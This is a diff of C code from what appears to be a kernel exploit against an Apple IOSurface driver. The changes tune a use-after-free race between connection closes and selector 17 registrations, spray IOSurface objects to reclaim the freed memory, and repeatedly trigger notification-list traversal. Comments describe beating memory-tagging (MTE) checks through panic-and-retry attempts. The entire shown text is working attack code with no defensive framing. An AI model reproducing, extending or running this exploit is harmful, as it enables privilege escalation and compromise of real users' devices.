@@ -26629,17 +26629,17 @@ new_modes:
                 CFDictionarySetValue(sp229, CFSTR("IOSurfaceBytesPerRow"), rn229);
                 CFDictionarySetValue(sp229, CFSTR("IOSurfacePixelFormat"), pfn229);
 
-                /* Step 2: Minimal race — 2 connections, trigger UAF with sel17/IOServiceClose race
-                 * Goal: create exactly 1 stale notification entry (GEN2) pointing to freed IOSurface (GEN1)
-                 * Fewer connections = fewer stale entries = need only 1 MTE tag to match (1/16)
-                 * vs 8 connections where ALL must match = (1/16)^N which is impossible */
-                rlog("  Step 2: Minimal v_race8 (2 conn) x5 iterations\n");
+                /* Step 2: Race — 4 connections, trigger UAF with sel17/IOServiceClose race
+                 * Goal: create a few stale notification entries (GEN2) pointing to freed IOSurface (GEN1)
+                 * Only ONE stale entry needs MTE match = 1/16 probability
+                 * Multiple entries increase chance of at least one being traversed */
+                rlog("  Step 2: v_race (4 conn) x10 iterations\n");
                 uint64_t inp229[3] = {1, 2, 3};
 
-                for (int iter = 0; iter < 5; iter++) {
-                    io_connect_t cs229[2];
-                    int have229[2] = {0, 0};
-                    for (int i = 0; i < 2; i++) {
+                for (int iter = 0; iter < 10; iter++) {
+                    io_connect_t cs229[4];
+                    int have229[4] = {0, 0, 0, 0};
+                    for (int i = 0; i < 4; i++) {
                         if (IOServiceOpen(svc229, mach_task_self(), 0, &cs229[i]) == KERN_SUCCESS) {
                             have229[i] = 1;
                             mach_port_t twp = MACH_PORT_NULL;
@@ -26652,7 +26652,7 @@ new_modes:
                         }
                     }
 
-                    /* Spam thread on first connection — creates race window */
+                    /* Spam threads — creates race window */
                     p13_spam_run = 1;
                     p13_spam_conn = have229[0] ? cs229[0] : IO_OBJECT_NULL;
                     p13_spam_shape = 1;
@@ -26662,17 +26662,16 @@ new_modes:
                         pthread_create(&spam229[t], NULL, p13_spam_reg, NULL);
 
                     /* Staggered close — trigger the race */
-                    for (int i = 0; i < 2; i++) {
-                        if (have229[i]) {
-                            IOServiceClose(cs229[i]);
-                            have229[i] = 0;
+                    for (int r = 0; r < 2; r++)
+                        for (int i = 0; i < 4; i++) {
+                            int j = (i * 3 + r) % 4;
+                            if (have229[j]) { IOServiceClose(cs229[j]); have229[j] = 0; }
+                            usleep(30 + (iter % 5) * 10);
                         }
-                        usleep(50 + iter * 30);
-                    }
 
                     p13_spam_run = 0;
                     for (int t = 0; t < 4; t++) pthread_join(spam229[t], NULL);
-                    for (int i = 0; i < 2; i++) if (have229[i]) IOServiceClose(cs229[i]);
+                    for (int i = 0; i < 4; i++) if (have229[i]) IOServiceClose(cs229[i]);
 
                     rlog("    iter[%d] spam=%llu\n", iter, (unsigned long long)p13_spam_count);
                 }
@@ -26710,27 +26709,44 @@ new_modes:
                 }
                 rlog("    Sprayed %d IOSurface objects into GEN1\n", spray229_n);
 
-                /* Step 5: Wait — give compositor/system time to traverse notification list
-                 * If MTE tags match: the stale entry reads IOSurface+0xD8 from our spray object
-                 *   → likely panic at lock acquisition (bad lock ptr) or further in dispatch
-                 *   → BUT we survived the MTE check, which is the hard part
-                 * If MTE tags don't match: MTE fault → kernel panic → reboot → try again */
-                rlog("  Step 5: Waiting 4s for compositor notification traversal...\n");
-                rlog("  If we survive: MTE MATCHED — controlled IOSurface confusion achieved!\n");
-                rlog("  If panic (ESR 0x96000011): MTE mismatch, reboot and retry\n");
+                /* Step 5: Actively trigger notification list traversal
+                 * The notification dispatch only runs when IOSurfaceRoot activity occurs.
+                 * We force it by rapidly creating connections, registering with sel17,
+                 * and closing them. Each close/register cycle makes the kernel walk
+                 * the notification list, which hits our stale entries.
+                 * If MTE tags match on the GEN1 reclaim: proceeds past the tag check
+                 * If MTE mismatch: ESR 0x96000011 → kernel panic → reboot */
+                rlog("  Step 5: Active notification trigger (sel17 churn)\n");
+                rlog("  If panic (ESR 0x96000011): MTE mismatch — reboot and retry\n");
 
-                /* Trigger notification dispatch by modifying our spray surfaces */
-                for (int wave = 0; wave < 4; wave++) {
-                    for (int i = 0; i < spray229_n && i < 48; i++) {
-                        if (spray229[i]) {
-                            IOSurfaceLock(spray229[i], 0, NULL);
-                            void *base = IOSurfaceGetBaseAddress(spray229[i]);
-                            if (base) memset(base, 0x41 + wave, 32 * 32 * 4);
-                            IOSurfaceUnlock(spray229[i], 0, NULL);
+                for (int wave = 0; wave < 8; wave++) {
+                    /* Churn: open 4 connections, register, close in rapid succession */
+                    for (int churn = 0; churn < 10; churn++) {
+                        io_connect_t ctrig = IO_OBJECT_NULL;
+                        if (IOServiceOpen(svc229, mach_task_self(), 0, &ctrig) == KERN_SUCCESS) {
+                            mach_port_t twp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                            mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xDA29000000000000ULL;
+                            uint64_t tinp[3] = {1, 2, 3};
+                            IOConnectCallAsyncMethod(ctrig, 17, twp, &ref, 1,
+                                NULL, 0, tinp, 24, NULL, NULL, NULL, NULL);
+                            usleep(100);
+                            IOServiceClose(ctrig);
+                            mach_port_deallocate(mach_task_self(), twp);
                         }
                     }
-                    usleep(1000000); /* 1s per wave */
-                    rlog("    wave %d/4 — still alive (good!)\n", wave + 1);
+                    /* Also try IOSurface property changes to trigger internal notifications */
+                    for (int i = 0; i < spray229_n && i < 48; i++) {
+                        if (spray229[i]) {
+                            int val = (wave << 16) | i;
+                            CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &val);
+                            IOSurfaceSetValue(spray229[i], CFSTR("_trig"), nv);
+                            CFRelease(nv);
+                        }
+                    }
+                    usleep(250000); /* 250ms between waves */
+                    rlog("    wave %d/8 — alive\n", wave + 1);
                 }
 
                 /* If we get here, either:
